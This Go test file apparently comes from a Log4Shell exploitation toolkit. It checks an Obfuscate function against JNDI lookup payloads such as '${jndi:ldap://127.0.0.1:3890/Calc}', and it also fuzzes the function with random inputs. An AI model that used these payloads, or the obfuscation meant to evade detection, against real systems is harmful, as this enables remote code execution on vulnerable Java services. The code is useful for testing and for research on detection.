package log4shell

import (
	"fmt"
	"testing"

	"github.com/stretchr/testify/require"
)

func TestObfuscate(t *testing.T) {
	t.Run("common", func(t *testing.T) {
		for _, testdata := range [...]string{
			"${jndi:ldap://127.0.0.1:3890/Calc}",
			"${jndi:ldap://127.0.0.1:3890/Notepad}",
			"${jndi:ldap://127.0.0.1:3890/Nop}",
			"test",
		} {
			obfuscated := Obfuscate(testdata)
			fmt.Println(testdata)
			fmt.Println(obfuscated)
			fmt.Println()
		}
	})

	t.Run("empty raw string", func(t *testing.T) {
		obfuscated := Obfuscate("")
		require.Zero(t, obfuscated)
	})

	t.Run("fuzz", func(t *testing.T) {
		for i := 0; i < 100000; i++ {
			raw := "${" + randString(64) + "}"
			obfuscated := Obfuscate(raw)
			require.NotZero(t, obfuscated)
		}
	})
}
